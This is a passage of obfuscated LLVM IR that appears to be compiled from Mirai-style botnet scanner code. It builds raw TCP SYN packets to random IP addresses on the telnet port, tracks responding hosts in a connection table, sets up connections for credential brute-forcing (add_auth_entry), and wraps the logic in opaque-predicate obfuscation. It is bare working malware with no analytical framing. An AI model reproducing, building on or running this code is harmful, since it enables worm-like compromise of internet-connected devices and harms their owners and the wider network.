  call void @add_auth_entry(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i32 0, i32 0), i16 zeroext 20)
  br label %213

; <label>:213:                                    ; preds = %1698, %167
  %214 = load i32, i32* @x.53
  %215 = load i32, i32* @y.54
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %213
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %222 = load i32, i32* @fake_time, align 4
  %223 = load i32, i32* %10, align 4
  %224 = icmp ne i32 %222, %223
  %225 = load i32, i32* @x.53
  %226 = load i32, i32* @y.54
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %224, label %233, label %313

; <label>:233:                                    ; preds = %originalBBpart216
  %234 = load i32, i32* @fake_time, align 4
  store i32 %234, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %235

; <label>:235:                                    ; preds = %309, %233
  %236 = load i32, i32* @x.53
  %237 = load i32, i32* @y.54
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %235
  %244 = load i32, i32* %1, align 4
  %245 = icmp slt i32 %244, 384
  %246 = load i32, i32* @x.53
  %247 = load i32, i32* @y.54
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %245, label %254, label %312

; <label>:254:                                    ; preds = %originalBBpart220
  %255 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %255, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %256 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i64 1
  %258 = bitcast %struct.iphdr* %257 to %struct.tcphdr*
  store %struct.tcphdr* %258, %struct.tcphdr** %16, align 8
  %259 = call i32 @rand_next()
  %260 = trunc i32 %259 to i16
  %261 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 3
  store i16 %260, i16* %262, align 4
  %263 = load i32, i32* @LOCAL_ADDR, align 4
  %264 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 8
  store i32 %263, i32* %265, align 4
  %266 = call i32 @get_random_ip()
  %267 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 9
  store i32 %266, i32* %268, align 4
  %269 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 7
  store i16 0, i16* %270, align 2
  %271 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %272 = bitcast %struct.iphdr* %271 to i16*
  %273 = call zeroext i16 @checksum_generic(i16* %272, i32 20)
  %274 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 7
  store i16 %273, i16* %275, align 2
  %276 = call zeroext i16 @htons(i16 zeroext 23) #7
  %277 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %278 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %277, i32 0, i32 1
  store i16 %276, i16* %278, align 2
  %279 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 9
  %281 = load i32, i32* %280, align 4
  %282 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 2
  store i32 %281, i32* %283, align 4
  %284 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %285 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %284, i32 0, i32 6
  store i16 0, i16* %285, align 4
  %286 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %287 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %288 = bitcast %struct.tcphdr* %287 to i8*
  %289 = call zeroext i16 @htons(i16 zeroext 20) #7
  %290 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %286, i8* %288, i16 zeroext %289, i32 20)
  %291 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %292 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %291, i32 0, i32 6
  store i16 %290, i16* %292, align 4
  %293 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %293, align 4
  %294 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 9
  %296 = load i32, i32* %295, align 4
  %297 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %298 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %297, i32 0, i32 0
  store i32 %296, i32* %298, align 4
  %299 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %300 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %299, i32 0, i32 1
  %301 = load i16, i16* %300, align 2
  %302 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %301, i16* %302, align 2
  %303 = load i32, i32* @rsck, align 4
  %304 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %305 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %305, %struct.sockaddr** %304, align 8
  %306 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %307 = load %struct.sockaddr*, %struct.sockaddr** %306, align 8
  %308 = call i64 @sendto(i32 %303, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %307, i32 16)
  br label %309

; <label>:309:                                    ; preds = %254
  %310 = load i32, i32* %1, align 4
  %311 = add nsw i32 %310, 1
  store i32 %311, i32* %1, align 4
  br label %235

; <label>:312:                                    ; preds = %originalBBpart220
  br label %313

; <label>:313:                                    ; preds = %312, %originalBBpart216
  %314 = load i32, i32* @x.53
  %315 = load i32, i32* @y.54
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %313
  store i32 0, i32* %9, align 4
  %322 = load i32, i32* @x.53
  %323 = load i32, i32* @y.54
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %330

; <label>:330:                                    ; preds = %655, %563, %535, %originalBBpart248, %487, %479, %471, %446, %421, %originalBBpart236, %originalBBpart228, %originalBBpart224
  %331 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %332 = bitcast i8* %331 to %struct.iphdr*
  store %struct.iphdr* %332, %struct.iphdr** %20, align 8
  %333 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %334 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %333, i64 1
  %335 = bitcast %struct.iphdr* %334 to %struct.tcphdr*
  store %struct.tcphdr* %335, %struct.tcphdr** %21, align 8
  %336 = call i32* @__errno_location() #7
  store i32 0, i32* %336, align 4
  %337 = load i32, i32* @rsck, align 4
  %338 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %339 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %339, align 8
  %340 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %341 = load %struct.sockaddr*, %struct.sockaddr** %340, align 8
  %342 = call i64 @recvfrom(i32 %337, i8* %338, i64 1514, i32 16384, %struct.sockaddr* %341, i32* null)
  %343 = trunc i64 %342 to i32
  store i32 %343, i32* %18, align 4
  %344 = load i32, i32* %18, align 4
  %345 = icmp sle i32 %344, 0
  br i1 %345, label %354, label %346

; <label>:346:                                    ; preds = %330
  %347 = call i32* @__errno_location() #7
  %348 = load i32, i32* %347, align 4
  %349 = icmp eq i32 %348, 11
  br i1 %349, label %354, label %350

; <label>:350:                                    ; preds = %346
  %351 = call i32* @__errno_location() #7
  %352 = load i32, i32* %351, align 4
  %353 = icmp eq i32 %352, 11
  br i1 %353, label %354, label %355

; <label>:354:                                    ; preds = %350, %346, %330
  br label %667

; <label>:355:                                    ; preds = %350
  %356 = load i32, i32* %18, align 4
  %357 = sext i32 %356 to i64
  %358 = icmp ult i64 %357, 40
  br i1 %358, label %359, label %376

; <label>:359:                                    ; preds = %355
  %360 = load i32, i32* @x.53
  %361 = load i32, i32* @y.54
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %359
  %368 = load i32, i32* @x.53
  %369 = load i32, i32* @y.54
  %370 = sub i32 %368, 1
  %371 = mul i32 %368, %370
  %372 = urem i32 %371, 2
  %373 = icmp eq i32 %372, 0
  %374 = icmp slt i32 %369, 10
  %375 = or i1 %373, %374
  br i1 %375, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %330

; <label>:376:                                    ; preds = %355
  %377 = load i32, i32* @x.53
  %378 = load i32, i32* @y.54
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %376
  %385 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %386 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %385, i32 0, i32 9
  %387 = load i32, i32* %386, align 4
  %388 = load i32, i32* @LOCAL_ADDR, align 4
  %389 = icmp ne i32 %387, %388
  %390 = load i32, i32* @x.53
  %391 = load i32, i32* @y.54
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %389, label %398, label %415

; <label>:398:                                    ; preds = %originalBBpart232
  %399 = load i32, i32* @x.53
  %400 = load i32, i32* @y.54
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %398
  %407 = load i32, i32* @x.53
  %408 = load i32, i32* @y.54
  %409 = sub i32 %407, 1
  %410 = mul i32 %407, %409
  %411 = urem i32 %410, 2
  %412 = icmp eq i32 %411, 0
  %413 = icmp slt i32 %408, 10
  %414 = or i1 %412, %413
  br i1 %414, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %330

; <label>:415:                                    ; preds = %originalBBpart232
  %416 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 6
  %418 = load i8, i8* %417, align 1
  %419 = zext i8 %418 to i32
  %420 = icmp ne i32 %419, 6
  br i1 %420, label %421, label %422

; <label>:421:                                    ; preds = %415
  br label %330

; <label>:422:                                    ; preds = %415
  %423 = load i32, i32* @x.53
  %424 = load i32, i32* @y.54
  %425 = sub i32 %423, 1
  %426 = mul i32 %423, %425
  %427 = urem i32 %426, 2
  %428 = icmp eq i32 %427, 0
  %429 = icmp slt i32 %424, 10
  %430 = or i1 %428, %429
  br i1 %430, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %422
  %431 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %432 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %431, i32 0, i32 0
  %433 = load i16, i16* %432, align 4
  %434 = zext i16 %433 to i32
  %435 = call zeroext i16 @htons(i16 zeroext 23) #7
  %436 = zext i16 %435 to i32
  %437 = icmp ne i32 %434, %436
  %438 = load i32, i32* @x.53
  %439 = load i32, i32* @y.54
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %437, label %446, label %447

; <label>:446:                                    ; preds = %originalBBpart240
  br label %330

; <label>:447:                                    ; preds = %originalBBpart240
  %448 = load i32, i32* @x.53
  %449 = load i32, i32* @y.54
  %450 = sub i32 %448, 1
  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %447
  %456 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %457 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %456, i32 0, i32 1
  %458 = load i16, i16* %457, align 2
  %459 = zext i16 %458 to i32
  %460 = load i16, i16* %2, align 2
  %461 = zext i16 %460 to i32
  %462 = icmp ne i32 %459, %461
  %463 = load i32, i32* @x.53
  %464 = load i32, i32* @y.54
  %465 = sub i32 %463, 1
  %466 = mul i32 %463, %465
  %467 = urem i32 %466, 2
  %468 = icmp eq i32 %467, 0
  %469 = icmp slt i32 %464, 10
  %470 = or i1 %468, %469
  br i1 %470, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %462, label %471, label %472

; <label>:471:                                    ; preds = %originalBBpart244
  br label %330

; <label>:472:                                    ; preds = %originalBBpart244
  %473 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %474 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %473, i32 0, i32 4
  %475 = load i16, i16* %474, align 4
  %476 = lshr i16 %475, 9
  %477 = and i16 %476, 1
  %478 = icmp ne i16 %477, 0
  br i1 %478, label %480, label %479

; <label>:479:                                    ; preds = %472
  br label %330

; <label>:480:                                    ; preds = %472
  %481 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %482 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %481, i32 0, i32 4
  %483 = load i16, i16* %482, align 4
  %484 = lshr i16 %483, 12
  %485 = and i16 %484, 1
  %486 = icmp ne i16 %485, 0
  br i1 %486, label %488, label %487

; <label>:487:                                    ; preds = %480
  br label %330

; <label>:488:                                    ; preds = %480
  %489 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %490 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %489, i32 0, i32 4
  %491 = load i16, i16* %490, align 4
  %492 = lshr i16 %491, 10
  %493 = and i16 %492, 1
  %494 = icmp ne i16 %493, 0
  br i1 %494, label %495, label %512

; <label>:495:                                    ; preds = %488
  %496 = load i32, i32* @x.53
  %497 = load i32, i32* @y.54
  %498 = sub i32 %496, 1
  %499 = mul i32 %496, %498
  %500 = urem i32 %499, 2
  %501 = icmp eq i32 %500, 0
  %502 = icmp slt i32 %497, 10
  %503 = or i1 %501, %502
  br i1 %503, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %495
  %504 = load i32, i32* @x.53
  %505 = load i32, i32* @y.54
  %506 = sub i32 %504, 1
  %507 = mul i32 %504, %506
  %508 = urem i32 %507, 2
  %509 = icmp eq i32 %508, 0
  %510 = icmp slt i32 %505, 10
  %511 = or i1 %509, %510
  br i1 %511, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %330

; <label>:512:                                    ; preds = %488
  %513 = load i32, i32* @x.53
  %514 = load i32, i32* @y.54
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %512
  %521 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %522 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %521, i32 0, i32 4
  %523 = load i16, i16* %522, align 4
  %524 = lshr i16 %523, 8
  %525 = and i16 %524, 1
  %526 = icmp ne i16 %525, 0
  %527 = load i32, i32* @x.53
  %528 = load i32, i32* @y.54
  %529 = sub i32 %527, 1
  %530 = mul i32 %527, %529
  %531 = urem i32 %530, 2
  %532 = icmp eq i32 %531, 0
  %533 = icmp slt i32 %528, 10
  %534 = or i1 %532, %533
  br i1 %534, label %originalBBpart256, label %originalBB50alteredBB

originalBBpart256:                                ; preds = %originalBB50
  br i1 %526, label %535, label %536

; <label>:535:                                    ; preds = %originalBBpart256
  br label %330

; <label>:536:                                    ; preds = %originalBBpart256
  %537 = load i32, i32* @x.53
  %538 = load i32, i32* @y.54
  %539 = sub i32 %537, 1
  %540 = mul i32 %537, %539
  %541 = urem i32 %540, 2
  %542 = icmp eq i32 %541, 0
  %543 = icmp slt i32 %538, 10
  %544 = or i1 %542, %543
  br i1 %544, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %536
  %545 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %546 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %545, i32 0, i32 3
  %547 = load i32, i32* %546, align 4
  %548 = call i32 @ntohl(i32 %547) #7
  %549 = sub i32 %548, 1
  %550 = call i32 @htonl(i32 %549) #7
  %551 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 8
  %553 = load i32, i32* %552, align 4
  %554 = icmp ne i32 %550, %553
  %555 = load i32, i32* @x.53
  %556 = load i32, i32* @y.54
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBBpart266, label %originalBB58alteredBB

originalBBpart266:                                ; preds = %originalBB58
  br i1 %554, label %563, label %564

; <label>:563:                                    ; preds = %originalBBpart266
  br label %330

; <label>:564:                                    ; preds = %originalBBpart266
  store %struct.scanner_connection* null, %struct.scanner_connection** %22, align 8
  %565 = load i32, i32* %9, align 4
  store i32 %565, i32* %18, align 4
  br label %566

; <label>:566:                                    ; preds = %originalBBpart283, %564
  %567 = load i32, i32* %18, align 4
  %568 = icmp slt i32 %567, 256
  br i1 %568, label %569, label %635

; <label>:569:                                    ; preds = %566
  %570 = load i32, i32* @x.53
  %571 = load i32, i32* @y.54
  %572 = sub i32 %570, 1
  %573 = mul i32 %570, %572
  %574 = urem i32 %573, 2
  %575 = icmp eq i32 %574, 0
  %576 = icmp slt i32 %571, 10
  %577 = or i1 %575, %576
  br i1 %577, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %569
  %578 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %579 = load i32, i32* %18, align 4
  %580 = sext i32 %579 to i64
  %581 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %578, i64 %580
  %582 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %581, i32 0, i32 3
  %583 = load i32, i32* %582, align 8
  %584 = icmp eq i32 %583, 0
  %585 = load i32, i32* @x.53
  %586 = load i32, i32* @y.54
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br i1 %584, label %593, label %615

; <label>:593:                                    ; preds = %originalBBpart270
  %594 = load i32, i32* @x.53
  %595 = load i32, i32* @y.54
  %596 = sub i32 %594, 1
  %597 = mul i32 %594, %596
  %598 = urem i32 %597, 2
  %599 = icmp eq i32 %598, 0
  %600 = icmp slt i32 %595, 10
  %601 = or i1 %599, %600
  br i1 %601, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %593
  %602 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %603 = load i32, i32* %18, align 4
  %604 = sext i32 %603 to i64
  %605 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %602, i64 %604
  store %struct.scanner_connection* %605, %struct.scanner_connection** %22, align 8
  %606 = load i32, i32* %18, align 4
  store i32 %606, i32* %9, align 4
  %607 = load i32, i32* @x.53
  %608 = load i32, i32* @y.54
  %609 = sub i32 %607, 1
  %610 = mul i32 %607, %609
  %611 = urem i32 %610, 2
  %612 = icmp eq i32 %611, 0
  %613 = icmp slt i32 %608, 10
  %614 = or i1 %612, %613
  br i1 %614, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %635

; <label>:615:                                    ; preds = %originalBBpart270
  br label %616

; <label>:616:                                    ; preds = %615
  %617 = load i32, i32* @x.53
  %618 = load i32, i32* @y.54
  %619 = sub i32 %617, 1
  %620 = mul i32 %617, %619
  %621 = urem i32 %620, 2
  %622 = icmp eq i32 %621, 0
  %623 = icmp slt i32 %618, 10
  %624 = or i1 %622, %623
  br i1 %624, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %616
  %625 = load i32, i32* %18, align 4
  %626 = add nsw i32 %625, 1
  store i32 %626, i32* %18, align 4
  %627 = load i32, i32* @x.53
  %628 = load i32, i32* @y.54
  %629 = sub i32 %627, 1
  %630 = mul i32 %627, %629
  %631 = urem i32 %630, 2
  %632 = icmp eq i32 %631, 0
  %633 = icmp slt i32 %628, 10
  %634 = or i1 %632, %633
  br i1 %634, label %originalBBpart283, label %originalBB76alteredBB

originalBBpart283:                                ; preds = %originalBB76
  br label %566

; <label>:635:                                    ; preds = %originalBBpart274, %566
  %636 = load i32, i32* @x.53
  %637 = load i32, i32* @y.54
  %638 = sub i32 %636, 1
  %639 = mul i32 %636, %638
  %640 = urem i32 %639, 2
  %641 = icmp eq i32 %640, 0
  %642 = icmp slt i32 %637, 10
  %643 = or i1 %641, %642
  br i1 %643, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %635
  %644 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %645 = icmp eq %struct.scanner_connection* %644, null
  %646 = load i32, i32* @x.53
  %647 = load i32, i32* @y.54
  %648 = sub i32 %646, 1
  %649 = mul i32 %646, %648
  %650 = urem i32 %649, 2
  %651 = icmp eq i32 %650, 0
  %652 = icmp slt i32 %647, 10
  %653 = or i1 %651, %652
  br i1 %653, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br i1 %645, label %654, label %655

; <label>:654:                                    ; preds = %originalBBpart287
  br label %667

; <label>:655:                                    ; preds = %originalBBpart287
  %656 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %657 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %656, i32 0, i32 8
  %658 = load i32, i32* %657, align 4
  %659 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %660 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %659, i32 0, i32 4
  store i32 %658, i32* %660, align 4
  %661 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %662 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %661, i32 0, i32 0
  %663 = load i16, i16* %662, align 4
  %664 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %665 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %664, i32 0, i32 5
  store i16 %663, i16* %665, align 8
  %666 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  call void @setup_connection(%struct.scanner_connection* %666)
  br label %330

; <label>:667:                                    ; preds = %654, %354
  br label %668

; <label>:668:                                    ; preds = %667
  %669 = load i32, i32* @x.53
  %670 = load i32, i32* @y.54
  %671 = sub i32 %669, 1
  %672 = mul i32 %669, %671
  %673 = urem i32 %672, 2
  %674 = icmp eq i32 %673, 0
  %675 = icmp slt i32 %670, 10
  %676 = or i1 %674, %675
  br i1 %676, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %668
  %677 = getelementptr inbounds %struct.fd_set.18, %struct.fd_set.18* %5, i32 0, i32 0
  %678 = getelementptr inbounds [16 x i64], [16 x i64]* %677, i64 0, i64 0
  %679 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %678) #6, !srcloc !1
  %680 = extractvalue { i64, i64* } %679, 0
  %681 = extractvalue { i64, i64* } %679, 1
  %682 = trunc i64 %680 to i32
  store i32 %682, i32* %24, align 4
  %683 = ptrtoint i64* %681 to i64
  %684 = trunc i64 %683 to i32
  store i32 %684, i32* %25, align 4
  %685 = load i32, i32* @x.53
  %686 = load i32, i32* @y.54
  %687 = sub i32 %685, 1
  %688 = mul i32 %685, %687
  %689 = urem i32 %688, 2
  %690 = icmp eq i32 %689, 0
  %691 = icmp slt i32 %686, 10
  %692 = or i1 %690, %691
  br i1 %692, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br label %693

; <label>:693:                                    ; preds = %originalBBpart291
  br label %694

; <label>:694:                                    ; preds = %693
  %695 = getelementptr inbounds %struct.fd_set.18, %struct.fd_set.18* %6, i32 0, i32 0
  %696 = getelementptr inbounds [16 x i64], [16 x i64]* %695, i64 0, i64 0
  %697 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %696) #6, !srcloc !2
  %698 = extractvalue { i64, i64* } %697, 0
  %699 = extractvalue { i64, i64* } %697, 1
  %700 = trunc i64 %698 to i32
  store i32 %700, i32* %26, align 4
  %701 = ptrtoint i64* %699 to i64
  %702 = trunc i64 %701 to i32
  store i32 %702, i32* %27, align 4
  br label %703

; <label>:703:                                    ; preds = %694
  store i32 0, i32* %1, align 4
  br label %704

; <label>:704:                                    ; preds = %937, %703
  %705 = load i32, i32* %1, align 4
  %706 = icmp slt i32 %705, 256
  br i1 %706, label %707, label %940

; <label>:707:                                    ; preds = %704
  %708 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %709 = load i32, i32* %1, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %708, i64 %710
  store %struct.scanner_connection* %711, %struct.scanner_connection** %7, align 8
  %712 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %713 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %712, i32 0, i32 3
  %714 = load i32, i32* %713, align 8
  %715 = icmp ugt i32 %714, 1
  %716 = select i1 %715, i32 30, i32 5
  store i32 %716, i32* %28, align 4
  %717 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %718 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %717, i32 0, i32 3
  %719 = load i32, i32* %718, align 8
  %720 = icmp ne i32 %719, 0
  br i1 %720, label %721, label %777

